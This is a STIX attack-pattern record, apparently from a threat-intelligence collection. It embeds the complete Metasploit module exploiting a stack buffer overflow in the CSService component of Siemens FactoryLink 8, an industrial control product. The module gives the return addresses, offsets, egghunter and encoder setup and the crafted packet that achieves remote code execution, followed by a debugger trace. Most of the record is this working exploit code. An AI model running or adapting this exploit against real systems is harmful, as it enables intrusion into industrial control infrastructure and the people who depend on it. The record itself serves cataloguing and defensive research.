{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3d572cc-ef06-48bf-8b64-3f08d5982ca0",
    "created": "2024-08-14T16:39:38.903778Z",
    "modified": "2024-08-14T16:39:38.903782Z",
    "name": "\"Siemens FactoryLink 8 CSService Logging Path Param Buffer Overflow\"",
    "description": " This module exploits a vulnerability found on Siemens FactoryLink 8. The vulnerability occurs when CSService.exe processes a CSMSG_ListFiles_REQ message the user-supplied path first gets converted to ANSI format (CodePage 0), and then gets handled by a logging routine where proper bounds checking is not done therefore causing a stack-based buffer overflow, and results arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/factorylink_csservice.rb",
            "external_id": "factorylink_csservice.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/factorylink_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-091-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Siemens FactoryLink 8 CSService Logging Path Param Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found on Siemens FactoryLink 8. The\n        vulnerability occurs when CSService.exe processes a CSMSG_ListFiles_REQ message,\n        the user-supplied path first gets converted to ANSI format (CodePage 0), and then\n        gets handled by a logging routine where proper bounds checking is not done,\n        therefore causing a stack-based buffer overflow, and results arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma <aluigi[at]autistici.org>',  #Initial discovery, poc\n          'sinn3r',  #Metasploit (thx hal)\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '72812'],\n          ['URL', 'http://aluigi.altervista.org/adv/factorylink_1-adv.txt'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-091-01']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8e\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9e\\x9f\",\n          'StackAdjustment' => -3500,\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' => {'BufferRegister'=>'ECX'},\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"process\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3',\n            {\n              'Offset' => 965,         #Offset to overwrite RETN\n              'Ret'    => 0x7e4456f7,  #JMP ESP in USER32.dll\n              'Max'    => 1400,        #Max buffer used\n            }\n          ],\n          [\n            'Windows Server 2003 SP0',\n            {\n              'Offset' => 965,\n              'Ret'    => 0x77d20738,  #JMP ESP in USER32.dll\n              'Max'    => 1400,\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-25'))\n\n      register_options(\n        [\n          Opt::RPORT(7580)\n        ])\n  end\n\n  #User input will get converted back to ANSCI with WideCharToMultiByte before vsprintf\n  def to_unicode(text)\n    output = ''\n    (text.length).times do |i|\n      output << text[i,1] << \"\\x00\"\n    end\n    return output\n  end\n\n  def exploit\n\n    #Modify payload\n    #XP = Align EAX 0x3a bytes.  Win2k3SP0 = 0x0a bytes\n    p  = \"\\x57\"      #PUSH EDI\n    p << \"\\x59\"      #POP ECX\n    p << ((target.name =~ /server 2003/i) ? \"\\xb0\\x0a\" : \"\\xb0\\x3a\")\n    p << \"\\x30\\xc1\"  #XOR CL,AL\n    p << payload.encoded\n\n    #Meterpreter tends to fail because of it being mangled.  We use an egghunter\n    #instead to ensure the payload's integrity.\n    egg_options =\n    {\n      :checksum => true,\n      :eggtag   => \"W00T\",\n    }\n\n    egghunter, p = generate_egghunter(p, payload_badchars, egg_options)\n\n    #x86/alpha_mixed egghunter\n    alpha_encoder = framework.encoders.create(\"x86/alpha_mixed\")\n    alpha_encoder.datastore.import_options_from_hash( {'BufferRegister'=>'ESP'} )\n    egghunter = alpha_encoder.encode(egghunter, nil, nil, platform)\n\n    sploit  = ''\n    sploit << make_nops(4)\n    sploit << p\n    sploit << rand_text_alpha(965-sploit.length)\n    sploit << [target.ret].pack('V*')\n    sploit << egghunter\n\n    sploit << rand_text_alpha(target['Max']-sploit.length)\n    sploit = to_unicode(sploit)\n\n    pkt  = \"\\x00\\x00\\x4c\\x45\\x4e\\x00\\x40\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x99\\x00\\x00\\x00\\x04\\x00\"\n    pkt << \"\\x00\\x00\\x01\\x07\\x00\\x00\\x0b\\x31\\x99\\x62\\x72\\x6b\\x01\\x00\\x00\\x00\\x02\\x04\\x00\\x00\"\n    pkt << \"\\x00\\x04\\x00\\x00\\x00\\x01\\x07\\x00\\x00\\x0b\\x19\\x99\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\"\n    pkt << \"\\x06\\x00\\x00\\x0a\\xf6\\x11\\x22\\x33\\x44\"\n    pkt << sploit\n    pkt << \"\\x00\\x00\\x06\\x00\\x00\\x00\\x06\\x11\\x22\\x33\\x44\\x00\\x00\\x04\\x00\\x00\\x00\\x04\\x00\\x00\"\n    pkt << \"\\x00\\x01\\x99\\x99\\x99\"\n\n    print_status(\"Sending malicious request to remote host...\")\n\n    connect\n    sock.put(pkt)\n    handler\n    select(nil, nil, nil, 6)\n    disconnect\n  end\nend\n\n=begin\n0:000> g\ncall vsprintf. Destination=0x0012ead0 Format=0x0043b92c Args=0x0012eedc\neax=0012eedc ebx=7c809a99 ecx=0043b92c edx=0012ead0 esi=0012eee8 edi=00000002\neip=0040b908 esp=0012eac4 ebp=0012fabc iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nCSService+0xb908:\n0040b908 ff15249b4400    call    dword ptr [CSService+0x49b24 (00449b24)] ds:0023:00449b24={msvcrt!vsprintf (77c3fe49)}\n\n0:000> dc 0012ead0\n0012ead0  65535343 63697672 43203a65 47534d53  CSService: CSMSG\n0012eae0  73694c5f 6c694674 525f7365 2d205145  _ListFiles_REQ -\n0012eaf0  6f685320 72694477 2c303d73 6c694620   ShowDirs=0, Fil\n0012eb00  3d726574 6150202c 613d6874 61616161  ter=, Path=aaaaa\n0012eb10  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n0012eb20  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n0012eb30  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n0012eb40  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa\n\n=end\n",
    "x_mitre_disclosure_date": "2011-03-25",
    "x_mitre_platforms": [
        "win'"
    ]
}